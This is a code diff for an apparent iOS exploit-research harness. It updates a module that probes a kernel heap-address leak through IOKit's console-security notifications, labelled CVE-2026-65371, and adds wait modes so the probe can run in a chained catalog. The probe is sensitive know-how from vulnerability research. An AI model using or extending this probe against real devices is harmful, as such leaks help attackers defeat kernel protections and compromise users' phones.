@@ -17,7 +17,7 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P097_BUILD @"p097-consolesec-v2-resume-drain"
+#define P097_BUILD @"p097-consolesec-v3-composed-skip"
 
 /* dlsym prototypes (local per P059/P032 convention) */
 typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
@@ -77,7 +77,14 @@ static void p097_interest_cb(void *refcon, io_service_t service,
 @implementation P097ConsoleSecLeak
 
 + (NSString *)tap {
+    return [self tapWithWaitSeconds:150.0];
+}
+
++ (NSString *)tapWithWaitSeconds:(NSTimeInterval)seconds {
     @synchronized ([P097ConsoleSecLeak class]) {
+        g_p097_hits = 0;
+        g_p097_arg = 0;
+        g_p097_msgType = 0;
         g_p097_buf = [NSMutableString string];
         NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
         NSString *path = [docs stringByAppendingPathComponent:@"p097_consolesec_log.txt"];
@@ -85,9 +92,13 @@ static void p097_interest_cb(void *refcon, io_service_t service,
 
         L(@"=== p097 session %@ BUILD %@ ===", LabLocalMilitaryNow() ?: @"?", P097_BUILD);
         L(@"CVE-2026-65371 gRegistryRoot instance leak via IOConsoleSecurityInterest.");
-        L(@"READ-ONLY. One interest notifier, one lock/unlock trigger from you.");
-        L(@"Leak = HEAP instance (not slide). Intel row gRegistryRoot = static var slot.");
+        L(@"READ-ONLY. One interest notifier. Leak = HEAP instance (not slide).");
         L(@"%@", [LabDeviceProfile identBlock] ?: @"ident ?");
+        if (seconds > 8.0) {
+            L(@"READ-ONLY. Catalog-solo: one lock/unlock trigger from you.");
+        } else {
+            L(@"[*] composed drain %.1fs — lock/unlock is catalog p097 (150 s).", seconds);
+        }
 
         void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
         if (!iokit) iokit = RTLD_DEFAULT;
@@ -149,23 +160,30 @@ static void p097_interest_cb(void *refcon, io_service_t service,
             goto finish;
         }
 
-        L(@"[*] NOW LOCK + UNLOCK the device (or lock from control center).");
-        L(@"[*] waiting up to 150 s on the run loop (v2 resume-drain: the app");
-        L(@"[*]   suspends on lock — the queued event must fire right after unlock).");
+        if (seconds > 8.0) {
+            L(@"[*] NOW LOCK + UNLOCK the device (or lock from control center).");
+            L(@"[*] waiting up to %.0f s on the run loop (v3 resume-drain: the app",
+              seconds);
+            L(@"[*]   suspends on lock — the queued event must fire right after unlock).");
+        } else if (seconds > 0) {
+            L(@"[*] drain %.1fs (no lock prompt). Catalog p097 is the interactive TAP.",
+              seconds);
+        } else {
+            L(@"[*] register-only (composed skip). Catalog p097 waits for lock/unlock.");
+        }
 
-        CFAbsoluteTime deadline = CFAbsoluteTimeGetCurrent() + 150.0;
-        while (g_p097_hits == 0 && CFAbsoluteTimeGetCurrent() < deadline) {
-            CFRunLoopRunInMode(kCFRunLoopDefaultMode, 1.0, false);
-            /* v2: also spin a background-eligible drain — the notification
-               port's messages queue while suspended; the 1.0 s loop pumps
-               them as soon as the app resumes (foreground re-entry). */
+        NSTimeInterval wait = seconds > 0 ? seconds : 0;
+        CFAbsoluteTime deadline = CFAbsoluteTimeGetCurrent() + wait;
+        while (g_p097_hits == 0 && wait > 0 && CFAbsoluteTimeGetCurrent() < deadline) {
+            CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.25, false);
             if (g_p097_hits == 0 && CFAbsoluteTimeGetCurrent() < deadline) {
-                CFRunLoopRunInMode(kCFRunLoopCommonModes, 0.1, true);
+                CFRunLoopRunInMode(kCFRunLoopCommonModes, 0.05, true);
             }
         }
 
         if (g_p097_hits == 0) {
-            L(@"[-] no console-security change observed in 150 s - the notifier");
+            L(@"[-] no console-security change observed in %.0f s - the notifier",
+              wait);
             L(@"[-] either fires only outside app lifetime on this train, or the");
             L(@"[-] IOConsoleSecurityInterest path changed on 27.x. Honest miss.");
         } else {
